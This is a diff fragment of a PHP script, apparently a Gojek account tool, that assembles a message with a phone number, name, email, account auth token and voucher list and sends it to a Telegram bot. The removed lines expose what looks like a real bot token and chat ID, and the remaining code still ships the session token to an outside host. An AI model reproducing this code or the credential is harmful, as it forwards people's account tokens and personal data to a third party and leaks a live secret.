@@ -149,8 +149,8 @@ ulang:
 						$expired14 = getStr1('"expiry_date":"','"',$cekvoucher,'14');
 						$expired15 = getStr1('"expiry_date":"','"',$cekvoucher,'15');
 						$expired16 = getStr1('"expiry_date":"','"',$cekvoucher,'16');
-						$TOKEN  = "873480014:AAHUikbxNQumWa3KkFeqIM-DK5DTc-IRKK4";
-						$chatid = "214480745";
+						$TOKEN  = ":";
+						$chatid = "";
 						$pesan 	= "Gojek Account Info\n\nNomor: ".$hp."\nNama: ".$nama."\nEmail: ".$email."@gmail.com\n\n".$token."\n\nTotalVoucher = ".$total."\n\n".$voucher1."\nExp:  ".$expired1."\n\n".$voucher2."\nExp: ".$expired2."\n\n".$voucher3."\nExp: ".$expired3."\n\n".$voucher4."\nExp: ".$expired4."\n\n".$voucher5."\nExp: ".$expired5."\n\n".$voucher6."\nExp: ".$expired6."\n\n".$voucher7."\nExp: ".$expired7."\n\n".$voucher8."\nExp: ".$expired8."\n\n".$voucher9."\nExp: ".$expired9."\n\n".$voucher10."\nExp: ".$expired10."\n\n".$voucher11."\nExp: ".$expired11."\n\n".$voucher12."\nExp: ".$expired12."\n\n".$voucher13."\nExp: ".$expired13."\n";
 						$method	= "sendMessage";
 						$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
